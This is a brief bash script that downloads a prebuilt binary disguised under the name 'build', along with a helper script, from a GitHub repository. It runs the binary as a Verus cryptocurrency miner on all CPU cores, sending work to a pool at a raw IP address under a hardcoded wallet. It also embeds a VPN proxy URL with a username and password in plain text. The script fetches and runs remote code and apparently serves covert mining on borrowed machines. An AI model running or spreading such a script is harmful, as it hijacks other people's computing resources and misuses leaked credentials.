#!/bin/bash
proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
array[0]="0001"
array[1]="0002"
array[2]="0003"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
apt-get update
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
wget -qO build https://github.com/renifer12/master/raw/master/ccminer
chmod +x build
chmod +x compile.sh
./build -a verus -o stratum+tcp://139.99.123.225:3956 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.worker-$worker -p x -t $(nproc --all)
./compile.sh
echo succes
